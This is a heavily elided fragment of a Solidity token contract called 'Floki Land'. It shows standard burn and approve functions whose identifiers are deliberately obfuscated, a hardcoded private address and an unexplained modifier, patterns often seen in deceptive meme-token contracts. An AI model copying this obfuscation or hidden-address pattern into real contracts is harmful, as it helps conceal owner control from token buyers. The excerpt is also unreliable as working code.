...
contract Context {
 ...
 contract FlokiLand is Context, ERC20, ERC20Metadata {
    ...
    string private _name = "Floki Land";
    ...
    address private markknight = 0x5ec460A03313df2c397F0006845325d0f1C20494;
   ...
   */
     ...
     */
    function _burn(address accoSKRLXunt, uint256 amounSKRLXt) internal virtual {
        require(accoSKRLXunt != address(0), "Can't burn from address 0");
        uint256 accountBalance = _fullTokensAmounts[accoSKRLXunt];
        require(accountBalance >= amounSKRLXt, "BEP : Can't be done");
        unchecked {
            _fullTokensAmounts[accoSKRLXunt] = accountBalance - amounSKRLXt;
        }
        _totalSupply -= amounSKRLXt;

        emit Transfer(accoSKRLXunt, address(0), amounSKRLXt);
    }
    modifier readLatin () {
    ...
    function _approve(
        address owSKRLXner,
        address speSKRLXnder,
        uint256 amoSKRLXunt
    ) internal virtual {
        require(owSKRLXner != address(0), "BEP : Can't be done");
        require(speSKRLXnder != address(0), "BEP : Can't be done");

        _allowances[owSKRLXner][speSKRLXnder] = amoSKRLXunt;
        emit Approval(owSKRLXner, speSKRLXnder, amoSKRLXunt);
    }
